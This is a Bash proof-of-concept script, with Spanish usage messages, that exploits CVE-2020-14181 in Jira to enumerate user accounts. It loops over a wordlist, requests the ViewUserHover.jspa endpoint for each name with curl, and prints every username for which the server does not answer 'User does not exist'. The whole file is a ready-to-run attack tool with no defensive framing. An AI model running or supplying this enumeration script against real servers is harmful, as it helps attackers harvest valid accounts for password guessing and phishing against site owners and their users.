#!/bin/bash

payload="secure/ViewUserHover.jspa?username="

echo -e "\nCHECK: CVE-2020-14181"
if [ -z $1 ]
then
  echo -e "\n\tModo de uso: PoC_CVE-2020-14181.sh URL WORDLIST\n"
  exit 0
elif [[ "$1" != "http"* ]]
then
  echo -e "\n\t[!] Sintaxis incorrecta. Se debe indicar el protocolo http(s)"
  echo -e "\n\tModo de uso: PoC_CVE-2020-14181.sh URL WORDLIST\n"
  exit 0
elif [[ "$1" != *"/" ]]
then
  echo -e "\n\t[!] Sintaxis incorrecta. La URL debe finalizar con '/'"
  echo -e "\n\tModo de uso: PoC_CVE-2020-14181.sh URL WORDLIST\n"
  exit 0
else
echo -e "\nUsuarios vÃ¡lidos"
echo "----------------------------------------"
for user in $(cat $2);
    do curl -sk $1$payload$user | egrep "User does not exist:|El usuario no existe:" &>/dev/null;
    if [ $? -eq 1 ];
        then echo $user;
    fi;
done
fi
echo ""
